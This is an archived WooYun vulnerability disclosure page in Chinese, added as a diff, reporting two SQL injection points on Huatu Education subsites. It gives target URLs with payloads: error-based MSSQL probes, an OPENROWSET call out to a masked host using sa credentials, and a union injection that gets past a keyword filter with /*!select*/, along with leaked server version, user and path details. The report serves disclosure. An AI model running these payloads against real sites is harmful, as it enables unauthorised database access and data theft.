@@ -1,0 +1,306 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		华图教育分站SQL注入两处  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		华图教育分站SQL注入两处  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/sql">sql</a> 
+</li><li>提交时间：		2013-11-18 19:27</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-23：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">华图教育分站SQL注入一枚</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">注入点：<br />
+<br />
+http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&amp;classtype=202&amp;province=7&amp;SubjectType=3&amp;id=24976<br />
+<br />
+<br />
+<br />
+随手打个单引号如下图：<br />
+<br />
+http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&amp;classtype=202&amp;province=7&amp;SubjectType=3&amp;id=24976&#039;<br />
+<br />
+</p><p class="detail"><a href="../images/16200422975ecbfe532b523f1d6614ff9b0c8829.jpg" target="_blank"><img src="../images/16200422975ecbfe532b523f1d6614ff9b0c8829.jpg" alt="111.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+SELECT n.Title,n.ClassNo,n.Price,n.hits,n.ActualPrice,n.SubjectType,n.ShortTitle,n.scaleimg,p.Course_type, p.Course_price, p.Course_number,s.SubjectName from NetClasses n,Cl_Course_Price p,NetClassSubjects s where n.rid=p.Course_id and n.SubjectType=s.rid and n.status=1 and n.videoType=5 and n.rid=24976‘<br />
+<br />
+<br />
+<br />
+Filename: E:\svn_1dui1\system\database\DB_driver.php<br />
+<br />
+数据库出错  还爆出了路径。<br />
+<br />
+肯定存在注入。<br />
+<br />
+最开始我以为php一般和mysql是一对好基友，谁知道这次可奇葩，竟然是mssql.<br />
+<br />
+看下图<br />
+<br />
+<br />
+<br />
+http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&amp;classtype=202&amp;province=7&amp;SubjectType=3&amp;id=24976 and 1=@@version<br />
+<br />
+</p><p class="detail"><a href="../images/1620064780f4a53fe421114b300b2896b1e3dc5b.jpg" target="_blank"><img src="../images/1620064780f4a53fe421114b300b2896b1e3dc5b.jpg" alt="2222.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+Microsoft SQL Server 2000 - 8.00.2039 (Intel X86) May 3 2005 23:18:38 Copyright (c) 1988-2003 Microsoft Corporation Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)<br />
+<br />
+<br />
+<br />
+还是mssql2000<br />
+<br />
+<br />
+<br />
+我用<br />
+<br />
+http://1dui1.huatu.com/index.php/OnlineDetail/?videoType=5&amp;classtype=202&amp;province=7&amp;SubjectType=3&amp;id=24976 and host_name()=@@servername<br />
+<br />
+测试返回失败。<br />
+<br />
+说明是站库分离的。<br />
+<br />
+<br />
+<br />
+后来我又测试<br />
+<br />
+http://1dui1.huatu.com/index.php/OnlineDetail/?<br />
+<br />
+<br />
+<br />
+videoType=5&amp;classtype=202&amp;province=7&amp;SubjectType=3&amp;id=24976;select a.* FROM OPENROWSET<br />
+<br />
+<br />
+<br />
+(&#039;SQLOLEDB&#039;,&#039;xx.xx.xx.xxx,443&#039;;&#039;sa&#039;;&#039;sa&#039;,&#039;select * FROM pubs.dbo.authors&#039;) as a;--<br />
+<br />
+<br />
+<br />
+也没弹回来。难道数据库服务器不能上网？<br />
+<br />
+<br />
+<br />
+算了，备份没戏了。放SQLMAP里跑吧<br />
+<br />
+</p><p class="detail"><a href="../images/16200942cb31ae0f9ba5215193e24cb589337b30.jpg" target="_blank"><img src="../images/16200942cb31ae0f9ba5215193e24cb589337b30.jpg" alt="3336.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+数据库名是：HTOLMain<br />
+<br />
+<br />
+<br />
+接下来就接着跑吧   都懂的  我就不浪费电了。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">另外一处SQL注入点是这个：<br />
+<br />
+http://sl.huatu.com/ArcList.php?act=1<br />
+<br />
+http://sl.huatu.com/ArcList.php?act=1&#039; and &#039;a&#039;=&#039;a 正常<br />
+<br />
+<br />
+<br />
+http://sl.huatu.com/ArcList.php?act=1&#039; and &#039;a&#039;=&#039;b 不正常<br />
+<br />
+典型的字符注入点<br />
+<br />
+<br />
+<br />
+本来我想直接 放SQLMAP里  我就看片去了。<br />
+<br />
+<br />
+<br />
+谁知道片看完了 也没跑出来。<br />
+<br />
+<br />
+<br />
+算了 亲自上阵吧。<br />
+<br />
+测了测才发现 他可能有 防注入的东东，一出现select 之类 就会死掉了。<br />
+<br />
+<br />
+<br />
+后来这样就可以了。<br />
+<br />
+http://sl.huatu.com/ArcList.php?act=1&#039; and 1=2 union all /*!select*/ 1,2,3,concat_ws(&quot;:&quot;,@@version,user(),@@datadir,database()),5,6,7,8,9,10,11,12,13,14%23<br />
+<br />
+</p><p class="detail"><a href="../images/1622591746334efd74b0115c5cbd9738660d2845.jpg" target="_blank"><img src="../images/1622591746334efd74b0115c5cbd9738660d2845.jpg" alt="44444.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+5.1.62-log:htol_shenlun@211.151.49.15:/usr/local/mysql/var/:... <br />
+<br />
+<br />
+<br />
+好了 版本 数据库名 用户名什么的都出来了。<br />
+<br />
+<br />
+<br />
+知道怎么绕过以后 再上工具吧<br />
+<br />
+吧select替换一下就可以了。<br />
+<br />
+</p><p class="detail"><a href="../images/1623003798edfcf1867dc04f4cb8561b71d37907.jpg" target="_blank"><img src="../images/1623003798edfcf1867dc04f4cb8561b71d37907.jpg" alt="55555.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+在这里设置一下即可。<br />
+<br />
+<br />
+<br />
+然后就扫出来了<br />
+<br />
+</p><p class="detail"><a href="../images/162301381720c6a50650028376ed2ae79c2136e7.jpg" target="_blank"><img src="../images/162301381720c6a50650028376ed2ae79c2136e7.jpg" alt="66666.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+主要后台我没扫出来。懒的深入了<br />
+<br />
+好了  收工，看片去了。<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/sql" title="sql">sql</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-043097" title="华图教育分站SQL注入两处">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-18 19:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+													<p class="detail">漏洞Rank：6 (WooYun评价)</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="43097";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
